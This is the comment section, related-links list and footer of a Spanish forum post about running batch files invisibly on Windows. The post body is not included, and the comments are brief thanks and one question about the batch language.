+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=414682" title="Usar la línea de comandos en Windows de la L-O"> Usar la línea de comandos en Windows de la L-O</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=414649" title="Usar la línea de comandos en Windows de la F-I"> Usar la línea de comandos en Windows de la F-I</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=414613" title="Usar la línea de comandos en Windows de la A-E"> Usar la línea de comandos en Windows de la A-E</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=414598" title="Lista de todos los comandos rápidos en Windows"> Lista de todos los comandos rápidos en Windows</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=414587" title="Códigos para crear aplicaciones, archivos batch"> Códigos para crear aplicaciones, archivos batch</a></span></span></li></ul></div>
+<div class="clearfix floatR" style="margin:0 30px;" >
+
+</div>
+</div><div id="all_coments" class="all_coments clearfix">
+<span class="num_comments "> <span id="num_com_add">5</span> Comentarios</span>
+<span class="onpost"> Como ejecutar archivos batch de forma invisible</span>
+<div class="comentario"></div><div id="comment_4445955" class="comentario coment_id_1">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="jalifa1923" href="?action=profile;user=jalifa1923">
+<img id="error_avatar" src="http://www.identi.li/images/def/avatar.png" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1947438" href="?action=profile;user=jalifa1923">jalifa1923</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1456516672" title="26/02/2016 a las 19:57 ">hace m&aacute;s de 9 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+GRACIAS
+</div>
+</div>
+</div>
+</div><div id="comment_4446046" class="comentario coment_id_2">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="marcenikki" href="?action=profile;user=marcenikki">
+<img id="error_avatar" src="https://upload.wikimedia.org/wikipedia/ang/d/d7/Ergo_proxy.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1819189" href="?action=profile;user=marcenikki">marcenikki</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1456519159" title="26/02/2016 a las 20:39 ">hace m&aacute;s de 9 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+<img src="https://identi.io/Smileys/default/icon_up.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_ojitos.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_up.png" alt="" border="0" />
+</div>
+</div>
+</div>
+</div><div id="comment_4446692" class="comentario coment_id_3">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="Adan_44" href="?action=profile;user=Adan_44">
+<img id="error_avatar" src="http://www.identi.li/images/def/avatar.png" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1948733" href="?action=profile;user=Adan_44">Adan_44</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1456544377" title="27/02/2016 a las 3:39 ">hace m&aacute;s de 9 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+Muy bueno gracias
+</div>
+</div>
+</div>
+</div><div id="comment_4447697" class="comentario coment_id_4">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="HASMER" href="?action=profile;user=HASMER">
+<img id="error_avatar" src="https://i.postimg.cc/xjGcYmq9/images.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1576503" href="?action=profile;user=HASMER">HASMER</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1456609818" title="27/02/2016 a las 21:50 ">hace m&aacute;s de 9 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+Que lenguaje de programacion es este Bath?<br />Visual?
+</div>
+</div>
+</div>
+</div><div id="comment_4447877" class="comentario coment_id_5">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="reformau" href="?action=profile;user=reformau">
+<img id="error_avatar" src="https://drive.google.com/file/d/1__UNS6yo-9h8LeX1jTfHcs3QtIJ8DiWQ/view?usp=sharing" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="16919" href="?action=profile;user=reformau">reformau</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1456618785" title="28/02/2016 a las 0:19 ">hace m&aacute;s de 9 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+Gracias por la informacion <img src="https://identi.io/Smileys/default/icon_up.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_up.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_up.png" alt="" border="0" />
+</div>
+</div>
+</div>
+</div><div class="paginater" style="border-top: 3px solid #EEE;padding: 10px;padding-bottom: 32px;height: 22px;"></div><div id="error_com"></div><div class="aviso_registrar">Para dejar un comentario <a rel="nofollow" href="?action=registrarse"> Registrate!</a> o.. eres ya usuario? <a href="?action=login" rel="nofollow" > Accede!</a></div></div></div>
+<div id="ads_1"></div>
+</div>
+<div class="clearfix small-footer">	 <div class="" id="search">
+<form id="ajaxSearch_form" action="https://identi.io/index.php?action=buscador" method="post" accept-charset="UTF-8">
+<input style="width:200px;" placeholder="Buscar..." id="searchbar" type="text" name="search" />
+<input id="searchbtn" type="submit" value=""/>
+</form>
+</div>
+</div>
+</div>
+</div>
+<div class="clearfix art-Footer" >
+<div class="clearfix footer-info ">
+<div class="clearfix">
+<ul>
+<li>Ayuda (Proximamente)</li>
+<li><a href="https://www.identi.io/index.php?action=contactenos">Contacto</a></li>
+</ul>
+<ul>
+<li><a href="https://www.identi.io/index.php?action=protocolo">Protocolo</a></li>
+<li><a href="https://www.identi.io/index.php?action=terminos-y-condiciones">Terminos y Condiciones</a></li>
+</ul>
+<ul>
+<li><a href="https://www.identi.io/tutoriales/sobreidenti.html">Sobre Identi</a></li>
+<li><a href="https://www.identi.io/index.php?action=reminder">Cambiar la contrase&ntilde;a</a></li>
+</ul>
+</div>
+<div class="clearfix copy "style="background :#1D468C url(/images/head/head_5.png) repeat-x;" >
+
+Identi - Todos los derechos reservados
+</div>
+</div>
+</div>
+<div style="display:none"><span itemscope itemtype="https://schema.org/Organization">
+  <link itemprop="url" href="https://www.identi.io">
+  <a itemprop="sameAs" href="https://www.facebook.com/Identi-Tus-descargas-sin-limites-478906072189600/?ref=br_rs">Facebook Identi</a>
+</span>
+</div>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9949ec4dde07deaa',t:'MTc2MTQ4MTM4Nw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
